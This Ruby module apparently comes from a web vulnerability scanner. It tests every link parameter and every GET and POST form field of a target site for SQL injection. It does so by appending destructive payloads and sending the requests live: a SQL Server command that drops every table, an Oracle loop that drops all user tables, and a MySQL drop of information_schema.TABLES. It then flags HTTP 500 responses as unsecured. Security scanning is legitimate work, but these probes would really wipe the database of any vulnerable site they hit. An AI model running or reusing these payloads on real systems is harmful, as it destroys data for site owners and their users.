# Test cases for drop all tables...
# 
# This can have very unexcepted behaviour, cause of settings of some web servers.
#
# @author Jan Strnadek, <jan.strnadek@gmail.com>

require_relative './interfaces/test_interface'
require_relative './helpers/test_helper'

class InsertInto < TestInterface
  # Test links
  def test_links
    sql_drops = [
      "EXEC sp_MSforeachtable @command1 = \"DROP TABLE ?\"", # SQL SERVER!!
      "Begin for c in (select table_name from user_tables) loop execute immediate ('drop table '||c.table_name||' cascade constraints); end loop; End;", # ORACLE
      "DROP TABLE information_schema.TABLES", # TRY MySQL - information schema delete table TABLES
    ]

    @parser_results[:links].each {
        |link|
        attr = link.attr
        if @options[:output_file]
          @options[:file] << "\tTest: " << link.url << "\n"
        else
          puts "\tTest: ".yellow.bold << link.url << "\n"
        end

        # Iterate parameters
        for i in 0..(attr.count - 1)
          sql_drops.each {
            |drop|

            attr_c = Marshal.load(Marshal.dump(attr))
            attr_c[i][1] += "'; " + drop
            
            result = TestHelper.get_request(TestHelper.create_url(link.url, attr_c))

            if result[:code].to_i == 500
              if @options[:output_file]
                @options[:file] << "\t\tParam: " << attr[i][0] << " - probably " << "UNSECURED - 500 after modification!\n"
              else
                puts "\t\tParam: ".red.bold << attr[i][0] << " - probably " << "UNSECURED - 500 after modification!".bold.red << "\n"
              end              
            end

            attr_c = Marshal.load(Marshal.dump(attr))
            attr_c[i][1] += "; " + drop

            result = TestHelper.get_request(TestHelper.create_url(link.url, attr_c))

            if result[:code].to_i == 500
              if @options[:output_file]
                @options[:file] << "\t\tParam: " << attr[i][0] << " - probably " << "UNSECURED - 500 after modification!\n"
              else
                puts "\t\tParam: ".red.bold << attr[i][0] << " - probably " << "UNSECURED - 500 after modification!".bold.red << "\n"
              end
            end
          }
        end
    }
  end

  def test_post_forms
    sql_drops = [
      "EXEC sp_MSforeachtable @command1 = \"DROP TABLE ?\"", # SQL SERVER!!
      "Begin for c in (select table_name from user_tables) loop execute immediate ('drop table '||c.table_name||' cascade constraints); end loop; End;", # ORACLE
      "DROP TABLE information_schema.TABLES", # TRY MySQL - information schema delete table TABLES
    ]
    
    @parser_results[:post_forms].each {
      |form|

      # Debug output
      if @options[:output_file]
        @options[:file] << "\tTest: " << form.action << "\n"
      else
        puts "\tTest: ".yellow.bold << form.action << "\n"
      end

      # Iterate parameters
      for i in 0..(form.params.count - 1)
        # Get original request
        post_uri = URI(form.action)

        sql_drops.each {
          |drop|

          # Get modify request
          modify_request = TestHelper.add_symbol_to_form_request(form.params, i, "'; " + drop)
          modify_request_2 = TestHelper.add_symbol_to_form_request(form.params, i, "; " + drop)

          # Param array ready
          result = TestHelper.post_request(post_uri, modify_request[:request])
          result_2 = TestHelper.post_request(post_uri, modify_request_2[:request])

          if result[:code].to_i == 500
            if @options[:output_file]
              @options[:file] << "\t\tParam: " << form.get_attr_name(i) << " - probably " << "UNSECURED - 500 after modification!\n"
            else
              puts "\t\tParam: ".red.bold << form.get_attr_name(i) << " - probably " << "UNSECURED - 500 after modification!".bold.red << "\n"
            end
          end
          
          if result_2[:code].to_i == 500
            if @options[:output_file]
              @options[:file] << "\t\tParam: " << form.get_attr_name(i) << " - probably " << "UNSECURED - 500 after modification!\n"
            else
              puts "\t\tParam: ".red.bold << form.get_attr_name(i) << " - probably " << "UNSECURED - 500 after modification!".bold.red << "\n"
            end
          end
        }
      end
    }
  end

  def test_get_forms
    sql_drops = [
      "EXEC sp_MSforeachtable @command1 = \"DROP TABLE ?\"", # SQL SERVER!!
      "Begin for c in (select table_name from user_tables) loop execute immediate ('drop table '||c.table_name||' cascade constraints); end loop; End;", # ORACLE
      "DROP TABLE information_schema.TABLES", # TRY MySQL - information schema delete table TABLES
    ]

    # Parse get forms
    @parser_results[:get_forms].each {
      |form|

      # Debug output
      if @options[:output_file]
        @options[:file] << "\tTest: " << form.action << "\n"
      else
        puts "\tTest: ".yellow.bold << form.action << "\n"
      end

      # Iterate parameters
      for i in 0..(form.params.count - 1)
        sql_drops.each {
          |drop|

          # Get modify request
          modify_request = TestHelper.add_symbol_to_form_request(form.params, i, "'; " + drop)
          modify_request_2 = TestHelper.add_symbol_to_form_request(form.params, i, "; " + drop)

          # Param array ready
          result = TestHelper.get_request(TestHelper.create_url(form.action, modify_request[:request]))
          result_2 = TestHelper.get_request(TestHelper.create_url(form.action, modify_request_2[:request]))          

          if result[:code].to_i == 500
            if @options[:output_file]
              @options[:file] << "\t\tParam: " << form.get_attr_name(i) << " - probably " << "UNSECURED - 500 after modification!\n"
            else
              puts "\t\tParam: ".red.bold << form.get_attr_name(i) << " - probably " << "UNSECURED - 500 after modification!".bold.red << "\n"
            end
          end

          if result_2[:code].to_i == 500
            if @options[:output_file]
              @options[:file] << "\t\tParam: " << form.get_attr_name(i) << " - probably " << "UNSECURED - 500 after modification!\n"
            else
              puts "\t\tParam: ".red.bold << form.get_attr_name(i) << " - probably " << "UNSECURED - 500 after modification!".bold.red << "\n"
            end
          end
        }
      end
    }
  end
end